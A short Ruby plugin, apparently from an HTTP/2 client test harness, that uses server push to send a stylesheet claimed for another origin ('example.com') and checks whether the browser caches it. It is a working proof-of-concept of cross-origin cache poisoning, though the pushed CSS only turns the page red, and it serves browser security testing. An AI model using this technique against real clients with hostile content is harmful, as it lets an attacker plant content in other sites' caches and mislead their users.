class CachePoisoning < ClientPlugin
  def name
    'Cache Poisoning'
  end

  def run(stream)
    host = 'example.com'
    #host = 'localhost:8080'

    response = "<head><link rel=\"stylesheet\" type=\"text/css\" href=\"https://#{host}/stylesheet.css\"></head>If the background is red, cache poisoning worked using server push"
    css = 'body { background-color: red; }'

    css_head = {
        ':method' => 'GET',
        ':scheme' => 'https',
        ':path'   => '/stylesheet.css',
        ':authority' => host,
        'accept-encoding' => 'gzip, deflate, sdch, br',
        'accept-language' =>  'en-US,en;q=0.8'
    }

    css_additional_headers = {
        ':status' => '200',
        'content-type' => 'text/css',
        'content-length' => css.bytesize.to_s
    }

    promise = nil

    stream.promise(css_head, end_headers: true) do |prom|
      promise = prom
    end

    stream.headers({
                       ':status' => '200',
                       'content-length' => response.bytesize.to_s,
                       'content-type' => 'text/html'
                   }, end_stream: false)

    promise.headers(css_additional_headers, end_headers: true)

    # split response into multiple DATA frames
    stream.data(response.slice!(0, 5), end_stream: false)
    stream.data(response)
    promise.data(css)
  end
end